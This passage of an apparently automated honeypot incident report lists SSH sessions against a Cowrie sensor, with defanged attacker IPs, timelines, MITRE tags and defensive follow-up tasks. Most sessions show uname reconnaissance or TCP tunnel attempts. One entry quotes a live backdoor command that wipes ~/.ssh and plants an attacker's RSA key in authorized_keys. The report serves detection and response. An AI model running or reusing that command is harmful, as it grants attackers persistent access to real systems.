| `2026-09-01 17:35:37` | `cowrie.command.input` |
| `2026-09-01 17:35:37` | `cowrie.log.closed` |
| `2026-09-01 17:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4740cfa7dde

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:35 |
| **Last Seen** | 2026-09-01 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:35:59` | `cowrie.session.connect` |
| `2026-09-01 17:35:59` | `cowrie.client.version` |
| `2026-09-01 17:35:59` | `cowrie.client.kex` |
| `2026-09-01 17:35:59` | `cowrie.login.success` |
| `2026-09-01 17:36:00` | `cowrie.session.params` |
| `2026-09-01 17:36:00` | `cowrie.command.input` |
| `2026-09-01 17:36:00` | `cowrie.log.closed` |
| `2026-09-01 17:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6bce4c0fb2f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.39[.]220` |
| **First Seen** | 2026-09-01 17:36 |
| **Last Seen** | 2026-09-01 17:40 |
| **Session Duration** | 242s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:36:06` | `cowrie.session.connect` |
| `2026-09-01 17:36:06` | `cowrie.client.version` |
| `2026-09-01 17:36:07` | `cowrie.client.kex` |
| `2026-09-01 17:36:07` | `cowrie.login.success` |
| `2026-09-01 17:36:08` | `cowrie.session.params` |
| `2026-09-01 17:36:08` | `cowrie.command.input` |
| `2026-09-01 17:36:08` | `cowrie.command.failed` |
| `2026-09-01 17:36:09` | `cowrie.log.closed` |
| `2026-09-01 17:36:10` | `cowrie.session.params` |
| `2026-09-01 17:36:10` | `cowrie.command.input` |
| `2026-09-01 17:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.39[.]220` to AbuseIPDB if not already reported
- [ ] Block `120.48.39[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8c853a8c6e

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:36 |
| **Last Seen** | 2026-09-01 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:36:21` | `cowrie.session.connect` |
| `2026-09-01 17:36:21` | `cowrie.client.version` |
| `2026-09-01 17:36:21` | `cowrie.client.kex` |
| `2026-09-01 17:36:21` | `cowrie.login.success` |
| `2026-09-01 17:36:22` | `cowrie.session.params` |
| `2026-09-01 17:36:22` | `cowrie.command.input` |
| `2026-09-01 17:36:22` | `cowrie.log.closed` |
| `2026-09-01 17:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb9090f757f1

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:36 |
| **Last Seen** | 2026-09-01 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:36:43` | `cowrie.session.connect` |
| `2026-09-01 17:36:43` | `cowrie.client.version` |
| `2026-09-01 17:36:44` | `cowrie.client.kex` |
| `2026-09-01 17:36:44` | `cowrie.login.success` |
| `2026-09-01 17:36:45` | `cowrie.session.params` |
| `2026-09-01 17:36:45` | `cowrie.command.input` |
| `2026-09-01 17:36:45` | `cowrie.log.closed` |
| `2026-09-01 17:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367f03ce21fb

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:37 |
| **Last Seen** | 2026-09-01 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:37:05` | `cowrie.session.connect` |
| `2026-09-01 17:37:05` | `cowrie.client.version` |
| `2026-09-01 17:37:05` | `cowrie.client.kex` |
| `2026-09-01 17:37:06` | `cowrie.login.success` |
| `2026-09-01 17:37:06` | `cowrie.session.params` |
| `2026-09-01 17:37:06` | `cowrie.command.input` |
| `2026-09-01 17:37:06` | `cowrie.log.closed` |
| `2026-09-01 17:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13c570845c61

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:37 |
| **Last Seen** | 2026-09-01 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:37:27` | `cowrie.session.connect` |
| `2026-09-01 17:37:27` | `cowrie.client.version` |
| `2026-09-01 17:37:27` | `cowrie.client.kex` |
| `2026-09-01 17:37:28` | `cowrie.login.success` |
| `2026-09-01 17:37:28` | `cowrie.session.params` |
| `2026-09-01 17:37:28` | `cowrie.command.input` |
| `2026-09-01 17:37:29` | `cowrie.log.closed` |
| `2026-09-01 17:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c55285e6db

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:37 |
| **Last Seen** | 2026-09-01 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:37:49` | `cowrie.session.connect` |
| `2026-09-01 17:37:49` | `cowrie.client.version` |
| `2026-09-01 17:37:49` | `cowrie.client.kex` |
| `2026-09-01 17:37:50` | `cowrie.login.success` |
| `2026-09-01 17:37:50` | `cowrie.session.params` |
| `2026-09-01 17:37:50` | `cowrie.command.input` |
| `2026-09-01 17:37:51` | `cowrie.log.closed` |
| `2026-09-01 17:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329fc5276548

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:38 |
| **Last Seen** | 2026-09-01 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:38:11` | `cowrie.session.connect` |
| `2026-09-01 17:38:11` | `cowrie.client.version` |
| `2026-09-01 17:38:11` | `cowrie.client.kex` |
| `2026-09-01 17:38:11` | `cowrie.login.success` |
| `2026-09-01 17:38:12` | `cowrie.session.params` |
| `2026-09-01 17:38:12` | `cowrie.command.input` |
| `2026-09-01 17:38:12` | `cowrie.log.closed` |
| `2026-09-01 17:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42bdc7122810

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:38 |
| **Last Seen** | 2026-09-01 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:38:33` | `cowrie.session.connect` |
| `2026-09-01 17:38:33` | `cowrie.client.version` |
| `2026-09-01 17:38:33` | `cowrie.client.kex` |
| `2026-09-01 17:38:33` | `cowrie.login.success` |
| `2026-09-01 17:38:34` | `cowrie.session.params` |
| `2026-09-01 17:38:34` | `cowrie.command.input` |
| `2026-09-01 17:38:34` | `cowrie.log.closed` |
| `2026-09-01 17:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-815f92feafcc

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:38 |
| **Last Seen** | 2026-09-01 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:38:54` | `cowrie.session.connect` |
| `2026-09-01 17:38:54` | `cowrie.client.version` |
| `2026-09-01 17:38:54` | `cowrie.client.kex` |
| `2026-09-01 17:38:54` | `cowrie.login.success` |
| `2026-09-01 17:38:55` | `cowrie.session.params` |
| `2026-09-01 17:38:55` | `cowrie.command.input` |
| `2026-09-01 17:38:55` | `cowrie.log.closed` |
| `2026-09-01 17:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b44373d3ec

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:39 |
| **Last Seen** | 2026-09-01 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:39:16` | `cowrie.session.connect` |
| `2026-09-01 17:39:16` | `cowrie.client.version` |
| `2026-09-01 17:39:16` | `cowrie.client.kex` |
| `2026-09-01 17:39:16` | `cowrie.login.success` |
| `2026-09-01 17:39:17` | `cowrie.session.params` |
| `2026-09-01 17:39:17` | `cowrie.command.input` |
| `2026-09-01 17:39:17` | `cowrie.log.closed` |
| `2026-09-01 17:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-143d298fc666

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:39 |
| **Last Seen** | 2026-09-01 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:39:36` | `cowrie.session.connect` |
| `2026-09-01 17:39:36` | `cowrie.client.version` |
| `2026-09-01 17:39:36` | `cowrie.client.kex` |
| `2026-09-01 17:39:37` | `cowrie.login.success` |
| `2026-09-01 17:39:37` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:39:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:39:37` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d5e6370fb71

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:39 |
| **Last Seen** | 2026-09-01 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:39:38` | `cowrie.session.connect` |
| `2026-09-01 17:39:38` | `cowrie.client.version` |
| `2026-09-01 17:39:38` | `cowrie.client.kex` |
| `2026-09-01 17:39:38` | `cowrie.login.success` |
| `2026-09-01 17:39:39` | `cowrie.session.params` |
| `2026-09-01 17:39:39` | `cowrie.command.input` |
| `2026-09-01 17:39:39` | `cowrie.log.closed` |
| `2026-09-01 17:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c802109f637a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:40 |
| **Last Seen** | 2026-09-01 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:40:43` | `cowrie.session.connect` |
| `2026-09-01 17:40:43` | `cowrie.client.version` |
| `2026-09-01 17:40:43` | `cowrie.client.kex` |
| `2026-09-01 17:40:44` | `cowrie.login.success` |
| `2026-09-01 17:40:44` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:40:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:40:45` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c07a56aa15ed

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 17:46 |
| **Last Seen** | 2026-09-01 17:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:46:57` | `cowrie.session.connect` |
| `2026-09-01 17:46:57` | `cowrie.client.version` |
| `2026-09-01 17:46:57` | `cowrie.client.kex` |
| `2026-09-01 17:46:59` | `cowrie.login.success` |
| `2026-09-01 17:46:59` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:46:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:46:59` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-011ee50c87ef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:49 |
| **Last Seen** | 2026-09-01 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:49:19` | `cowrie.session.connect` |
| `2026-09-01 17:49:19` | `cowrie.client.version` |
| `2026-09-01 17:49:19` | `cowrie.client.kex` |
| `2026-09-01 17:49:20` | `cowrie.login.success` |
| `2026-09-01 17:49:20` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:49:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:49:21` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ace5a722b6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-01 17:49 |
| **Last Seen** | 2026-09-01 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:49:54` | `cowrie.session.connect` |
| `2026-09-01 17:49:54` | `cowrie.client.version` |
| `2026-09-01 17:49:54` | `cowrie.client.kex` |
| `2026-09-01 17:49:54` | `cowrie.login.success` |
| `2026-09-01 17:49:54` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:49:55` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abca00533101

| Field | Detail |
|---|---|
| **Source IP** | `182.96.95[.]66` |
| **First Seen** | 2026-09-01 17:51 |
| **Last Seen** | 2026-09-01 17:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:51:16` | `cowrie.session.connect` |
| `2026-09-01 17:51:16` | `cowrie.client.version` |
| `2026-09-01 17:51:16` | `cowrie.client.kex` |
| `2026-09-01 17:51:17` | `cowrie.login.success` |
| `2026-09-01 17:51:18` | `cowrie.session.params` |
| `2026-09-01 17:51:18` | `cowrie.command.input` |
| `2026-09-01 17:51:18` | `cowrie.log.closed` |
| `2026-09-01 17:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.96.95[.]66` to AbuseIPDB if not already reported
- [ ] Block `182.96.95[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9dfe8bff41e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:51 |
| **Last Seen** | 2026-09-01 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:51:35` | `cowrie.session.connect` |
| `2026-09-01 17:51:35` | `cowrie.client.version` |
| `2026-09-01 17:51:35` | `cowrie.client.kex` |
| `2026-09-01 17:51:36` | `cowrie.login.success` |
| `2026-09-01 17:51:36` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:51:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:51:36` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd42eadc3e9

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 17:51 |
| **Last Seen** | 2026-09-01 17:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:51:37` | `cowrie.session.connect` |
| `2026-09-01 17:51:37` | `cowrie.client.version` |
| `2026-09-01 17:51:37` | `cowrie.client.kex` |
| `2026-09-01 17:51:42` | `cowrie.login.success` |
| `2026-09-01 17:51:43` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:51:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:51:43` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d6daf96b219

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 17:56 |
| **Last Seen** | 2026-09-01 17:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:56:45` | `cowrie.session.connect` |
| `2026-09-01 17:56:45` | `cowrie.client.version` |
| `2026-09-01 17:56:47` | `cowrie.client.kex` |
| `2026-09-01 17:56:52` | `cowrie.login.success` |
| `2026-09-01 17:56:53` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:56:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:56:53` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966378a8c8b7

| Field | Detail |
|---|---|
| **Source IP** | `27.79.5[.]21` |
| **First Seen** | 2026-09-01 17:58 |
| **Last Seen** | 2026-09-01 17:59 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:58:52` | `cowrie.session.connect` |
| `2026-09-01 17:58:52` | `cowrie.client.version` |
| `2026-09-01 17:58:55` | `cowrie.client.kex` |
| `2026-09-01 17:59:02` | `cowrie.login.success` |
| `2026-09-01 17:59:02` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:59:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:59:03` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.5[.]21` to AbuseIPDB if not already reported
- [ ] Block `27.79.5[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf91a1ad49f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:58 |
| **Last Seen** | 2026-09-01 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:58:53` | `cowrie.session.connect` |
| `2026-09-01 17:58:53` | `cowrie.client.version` |
| `2026-09-01 17:58:53` | `cowrie.client.kex` |
| `2026-09-01 17:58:54` | `cowrie.login.success` |
| `2026-09-01 17:58:54` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:58:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:58:55` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47797eab3937

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
